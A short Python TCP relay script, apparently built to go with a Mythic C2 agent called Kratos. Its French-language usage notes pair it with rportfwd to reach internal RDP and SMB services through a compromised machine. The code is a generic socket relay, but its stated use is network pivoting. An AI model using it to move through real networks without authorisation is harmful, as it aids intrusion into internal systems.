#!/usr/bin/env python3
"""
relay.py - Kratos rportfwd relay server
Usage: python3 relay.py <agent_port> <client_port>

Exemples :
  # RDP interne
  python3 relay.py 4444 13389
  # Mythic : rportfwd -LocalPort 3389 -RemoteHost <ton_ip> -RemotePort 4444
  # Puis   : xfreerdp /v:127.0.0.1:13389 /u:...

  # SMB interne
  python3 relay.py 4445 14445
  # Mythic : rportfwd -LocalPort 445 -RemoteHost <ton_ip> -RemotePort 4445
  # Puis   : smbclient //127.0.0.1:14445/...
"""
import socket
import sys
import threading


def relay(a: socket.socket, b: socket.socket) -> None:
    def fwd(src: socket.socket, dst: socket.socket) -> None:
        try:
            while chunk := src.recv(65536):
                dst.sendall(chunk)
        except OSError:
            pass
        finally:
            try:
                dst.shutdown(socket.SHUT_WR)
            except OSError:
                pass

    t = threading.Thread(target=fwd, args=(a, b), daemon=True)
    t.start()
    fwd(b, a)
    t.join()
    a.close()
    b.close()


def listen_one(port: int, label: str) -> socket.socket:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    print(f"[*] Waiting for {label} on :{port} ...")
    conn, addr = srv.accept()
    srv.close()
    print(f"[+] {label} connected from {addr[0]}:{addr[1]}")
    return conn


def main() -> None:
    if len(sys.argv) != 3:
        print(__doc__)
        sys.exit(1)

    agent_port  = int(sys.argv[1])
    client_port = int(sys.argv[2])

    results: list[socket.socket | None] = [None, None]
    errors:  list[Exception | None]     = [None, None]

    def get(port: int, label: str, idx: int) -> None:
        try:
            results[idx] = listen_one(port, label)
        except Exception as e:
            errors[idx] = e

    t0 = threading.Thread(target=get, args=(agent_port,  "Kratos agent", 0), daemon=True)
    t1 = threading.Thread(target=get, args=(client_port, "local client",  1), daemon=True)
    t0.start()
    t1.start()
    t0.join()
    t1.join()

    for err in errors:
        if err:
            print(f"[!] Error: {err}")
            sys.exit(1)

    print("[*] Both connected. Relaying ...")
    relay(results[0], results[1])
    print("[-] Session closed. Waiting for next connection ...\n")
    main()


if __name__ == "__main__":
    main()
